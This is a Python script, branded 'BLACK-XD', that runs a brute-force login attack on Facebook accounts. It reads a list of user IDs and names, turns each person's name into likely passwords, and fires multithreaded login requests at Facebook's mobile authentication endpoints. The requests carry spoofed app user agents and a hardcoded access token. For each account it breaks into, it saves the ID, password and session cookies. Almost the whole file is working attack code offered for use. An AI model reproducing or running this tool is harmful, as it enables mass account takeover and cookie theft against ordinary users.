#---------------------● IMPORT ●---------------------#
import requests,random,uuid,string,hashlib,json,os,base64,zlib,pip,urllib,urllib3
from os import path
from urllib.request import urlopen 
import platform,math,smtplib
try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess
	from string import *
	from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
	print(f'(●) INSTALLING MISSING MODULES ')
except:pass
rr = random.randint
rc = random.choice
def ua_asep():
	andro_verison = random.choice(["13","12","11", "10", "9", "8", "7", "6", "5"])
	andro_rmx = random.choice(["in-id","en-US","en-us","en-gb"])
	andro_Bulid = random.choice(["RKQ1.201217.002","QKQ1.200614.002"])
	stv = random.choice(["Tizen5.0","Tizen 8.0","Tizen 7.0","Tizen 5.5","Tizen 4.0.0.2","Tizen2.3","Tizen2.4.0","Tizen 8.0","Tizen-WASM 6.0","Tizen 6.0","Tizen 6.5"])
	ua_sya = f"Mozilla/5.0 (Linux; U; Android {andro_verison}; {andro_rmx}; RMX2195 Build/{andro_Bulid}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(50,150))}.0.{str(random.randint(2000,4999))}.{str(random.randint(5,150))} Mobile Safari/537.36 HeyTapBrowser/{str(random.randint(1,50))}.{str(random.randint(5,100))}.{str(random.randint(1,15))}.{str(random.randint(5,30))}"
	ua_sya1 = f"Mozilla/5.0 (Linux; U; Android {andro_verison}; {andro_rmx}; RMX2195 Build/{andro_Bulid}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(50,150))}.0.{str(random.randint(2000,4999))}.{str(random.randint(50,299))} UCBrowser/{str(random.randint(10,100))}.{str(random.randint(10,100))}.{str(random.randint(10,100))}.{str(random.randint(1000,2000))} Mobile Safari/537.36"
	ua_sya2 = f"Mozilla/5.0 (Linux; Android {andro_verison}; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.randint(50,150))}.0.{str(random.randint(2000,5999))}.{str(random.randint(50,299))} Mobile Safari/537.36"
	smrt = f"Mozilla/5.0(SMART-TV;{stv})AppleWebKit/537.36(KHTML,likeGecko)SamsungBrowser/2.2Chrome/{str(random.randint(50,150))}.0.{str(random.randint(2000,5999))}.{str(random.randint(50,299))}TVSafari/537.36"
	return random.choice(["ua_sya","ua_sya1","ua_sya2","smrt"])


def UserAgentDalvikFban():
	___M1X___ = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/419.0.0.27.57;FBBV/573810848;FBRV/0;FBPN/com.facebook.katana;FBLC/vi_VN;FBMF/Era 2X;FBBD/Era 2X;FBDV/XOLO;FBSV/10;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
	___M2X___ = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/Orca-Android;FBAV/360.0.0.74.642;FBPN/com.facebook.orca;FBLC/ar_EG;FBBV/493469136;FBCR/Rakuten;FBMF/samsung;FBBD/samsung;FBDV/SM-A705F;FBSV/16;FBCA/arm64-v8a:null;FBDM/{density=4,width=2230,height=2578};FB_FW/1;] FBBK/1'
	___M3X___ = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/184.0.0.29.122;FBPN/com.facebook.MobileAdsManagerAndroid;FBLC/fr_FR;FBBV/283750661;FBCR/Airtel;FBMF/OPPO;FBBD/OPPO;FBDV/CPH2332;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
	return random.choice([___M1X___,___M2X___,___M3X___,___M4X___,___M5X___])
#---------------------● LOOP ●---------------------#
loop=0;oks=[];cps=[];twf=[];pcp=[];id=[];tokenku=[];plist = []
#---------------------● COLOUR ●---------------------#
G="\x1b[38;5;46m";W="\x1b[38;5;15m";B="\x1b[38;5;265m";Y="\x1b[38;5;226m";A="\x1b[38;5;123m";R="\x1b[38;5;160m";O="\x1b[38;5;81m"
#---------------------● STYLE ●---------------------#
xd=f"{G}●{W}";xd1=f"{G}● {W}1";xd2=f"{G}● {W}2";xd3=f"{G}● {W}3";xd4=f"{G}● {W}4";xd5=f"{G}● {W}5";xd6=f"{G}● {W}6";xd0=f"{G}● {W}0";xdx=f"{G}● {W}?";xdxx=f"{G}:{W}"
#---------------------● CLEAR ●---------------------#
def clear():os.system('clear');print(logo)
def linex():print(f'{G}──────────────────────────────────────────────────')
#---------------------● LOGO ●---------------------#
logo=(f"""
   {W} ______         _______ _______ _     _
   {G} |_____] |      |_____| |       |____/ 
   {W} |_____] |_____ |     | |_____  |    \_ 0.0
{G}──────────────────────────────────────────────────
   {W}OWNER {G}:{W} BLACK-XD {G}|{W} TOOLS {G}:{W} FILE{G}|{W}RANDOM CLONE
{G}──────────────────────────────────────────────────""")
#---------------------● MAIN MENU ●---------------------#
def ___black___():
	clear();print(f"{xd1} START FILE CLONE ");print(f"{xd0} EXISTING CLONE ");linex();option = input(f"{xdx} SELECT {xdxx} ")
	if option in ["1"]:___filex___()
	if option in ["0"]:exit()
	else:linex();print(f"{xd} OPTION NOT FOUND ");linex();time.sleep(1);print(f"{xd} TRY AGAIN BROTHER");time.sleep(1);___black___()
#---------------------● FILEX ●---------------------#
def ___filex___():
	clear();print(f"{xd} EXAMPLE {xdxx} /sdcard/black.txt");linex();file = input(f"{xdx} ENTER FILE NAME {xdxx} ")
	try:
		fo = open(file,'r').read().splitlines()
	except FileNotFoundError:
		linex();print(f'{xd} FILE LOCATION NOT FOUND ');linex();time.sleep(1);print(f"{xd} TRY AGAIN BROTHER");time.sleep(1);___filex___()
	clear();print(f"{xd1} METHOD {O}>{G}>{W}M1{G}<{O}<");print(f"{xd2} METHOD {O}>{G}>{W}M2{G}<{O}<");print(f"{xd3} METHOD {O}>{G}>{W}M3{G}<{O}<");linex();methd = input(f"{xdx} SELECT {xdxx} ")
	clear();print(f'{xd} PASSWORD SYSTEM ');linex();print(f'{xd1} AUTO PASSWORD CLONE ONLY BD');print(f'{xd2} CHOICE PASSWORD CLONE');linex();ppp = input(f"{xdx} SELECT {xdxx} ")
	if ppp in ['1','01']:plist.append('first12');plist.append('first123');plist.append('first1234');plist.append('first12345');plist.append('first123456');plist.append('last01');plist.append('last02');plist.append('last11');plist.append('last22');plist.append('kamu nanya');plist.append('last');plist.append('first')
	else:
		try:
			clear();print(f"{xd} EXAMPLE {xdxx} BANGLADESH 5-30 {O}|{W} OTHERS 5-10");linex()
			ps_limit = int(input(f'{xdx} PASSWORDS LIMIT {xdxx} '))
		except:
			ps_limit = 5
		clear();print(f"{xd} EXAMPLE {xdxx} firstlast {G}|{W} first12 {G}|{W} first123 ");linex()
		for i in range(ps_limit):
			plist.append(input(f'{xd} PASSWORD NO{i+1} {xdxx}{G} '))
	with tred(max_workers=30) as __xxx___:
		clear();total_ids = str(len(fo))
		print(f'{xd} TOTAL FILE UID {xdxx}{G} {total_ids} ');print(f"{xd} IF NO RESULT ON{G}|{W}OFF AIRPLANE MODE");linex()
		for user in fo:
			ids,names = user.split('|')
			passlist = plist
			if methd in ['1']:__xxx___.submit(___M1___,ids,names,passlist)
			elif methd in ['2']:__xxx___.submit(___M2___,ids,names,passlist)
			elif methd in ['3']:__xxx___.submit(___M3___,ids,names,passlist)
	print('\033[1;37m');linex();print(f'{xd} THE PROCESS HAS COMPLETED');print(f'{xd} TOTAL OK{G}|{W}CP {xdxx} '+str(len(oks))+'|'+str(len(cps)));linex();exit()
#---------------------● FILE METHOD M1 ●---------------------#
def ___M1___(ids,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write(f'\r{G}●{W} BLACK-M1 %s{G}/{W}%s{G}/{W}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        ua = ua_asep()
                        ua = UserAgentDalvikFban()
                        ___M1X___ = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/419.0.0.27.57;FBBV/573810848;FBRV/0;FBPN/com.facebook.katana;FBLC/vi_VN;FBMF/Era 2X;FBBD/Era 2X;FBDV/XOLO;FBSV/10;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
                        data={"adid": str(uuid.uuid4()),
                                 "format": "json","device_id": str(uuid.uuid4()),
                                 "cpl": "true","family_device_id": str(uuid.uuid4()),
                                 "credentials_type": "device_based_login_password",
                                 "error_detail_type": "button_with_disabled",
                                 "source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "id_ID","client_country_code": "ID","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com",
                                  "User-Agent": ___M1X___,
                                  "X-FB-Net-HNI": "45204",
                                  "X-FB-SIM-HNI": "45201",
                                  "X-FB-Connection-Type": "MOBILE.LTE",
                                  "X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f'\r{G}● BLACK-OK '+ids+' | '+pas+'\033[1;97m')
                                        print(f"\r{G}●{W} COOKIES {G}:{W} "+coki);linex()
                                        open('/sdcard/BLACK-M1-FILE-OK.txt','a').write(ids+'|'+pas+ '|' +coki+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        print(f'\r{G}●{R} BLACK-CP '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/BLACK-M1-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#---------------------● FILE METHOD M2 ●---------------------#
def ___M2___(ids,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write(f'\r{G}●{W} BLACK-M2 %s{G}/{W}%s{G}/{W}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        #___M2X___ = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/Orca-Android;FBAV/360.0.0.74.642;FBPN/com.facebook.orca;FBLC/ar_EG;FBBV/493469136;FBCR/Rakuten;FBMF/samsung;FBBD/samsung;FBDV/SM-A705F;FBSV/16;FBCA/arm64-v8a:null;FBDM/{density=4,width=2230,height=2578};FB_FW/1;] FBBK/1'
                        data = {"adid": adid,"format": "json","device_id": str(uuid.uuid4()),
                                   "email": ids,"password": pas,
                                   "generate_analytics_claims": "1",
                                   "credentials_type": "password",
                                   "source": "login","error_detail_type": "button_with_disabled",
                                   "enroll_misauth": "false","generate_session_cookies": "1","generate_machine_id": "1","fb_api_req_friendly_name": "authenticate",}
                        headers = {"Accept-Encoding": "gzip, deflate","Accept": "*/*","Connection": "keep-alive",
                                   "User-Agent": UserAgentDalvikFban(),
                                   "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                                   "X-FB-Friendly-Name": "authenticate",
                                   "X-FB-Connection-Type": "MOBILE.LTE",
                                   "Content-Type": "application/x-www-form-urlencoded","X-FB-HTTP-Engine": "Liger","Content-Length": "329",}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f'\r{G}● BLACK-OK '+ids+' | '+pas+'\033[1;97m')
                                        print(f"\r{G}●{W} COOKIES {G}:{W} "+coki);linex()
                                        open('/sdcard/BLACK-M2-FILE-OK.txt','a').write(ids+'|'+pas+ '|' +coki+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        print(f'\r{G}●{R} BLACK-CP '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/BLACK-M2-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#---------------------● FILE METHOD M3 ●---------------------#
def ___M3___(ids,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write(f'\r{G}●{W} BLACK-M3 %s{G}/{W}%s{G}/{W}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        #___M3X___ = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/184.0.0.29.122;FBPN/com.facebook.MobileAdsManagerAndroid;FBLC/fr_FR;FBBV/283750661;FBCR/Airtel;FBMF/OPPO;FBBD/OPPO;FBDV/CPH2332;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
                        data = {'adid':adid,'format':'json','device_id':device_id,
                                   'email':ids,'password':pas,
                                   'generate_analytics_claims':'1',
                                   'credentials_type':'password',
                                   'source':'login','error_detail_type':'button_with_disabled',
                                   'enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','meta_inf_fbmeta':'','currently_logged_in_userid':'0','fb_api_req_friendly_name':'authenticate',}
                        headers={'Authorization':f'OAuth {accessToken}','X-FB-Friendly-Name':'authenticate',
                                   'X-FB-Connection-Type':'WIFI',
                                   'User-Agent':UserAgentDalvikFban(),
                                   'Accept-Encoding':'gzip, deflate',
                                   'Content-Type': 'application/x-www-form-urlencoded',
                                   'X-FB-HTTP-Engine': 'Liger'}
                        url = 'https://b-api.facebook.com/method/auth.login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f'\r{G}● BLACK-OK '+ids+' | '+pas+'\033[1;97m')
                                        print(f"\r{G}●{W} COOKIES {G}:{W} "+coki);linex()
                                        open('/sdcard/BLACK-M3-FILE-OK.txt','a').write(ids+'|'+pas+ '|' +coki+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error_msg']:
                                        print(f'\r{G}●{R} BLACK-CP '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/BLACK-M3-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#---------------------> END <---------------------#
___black___()
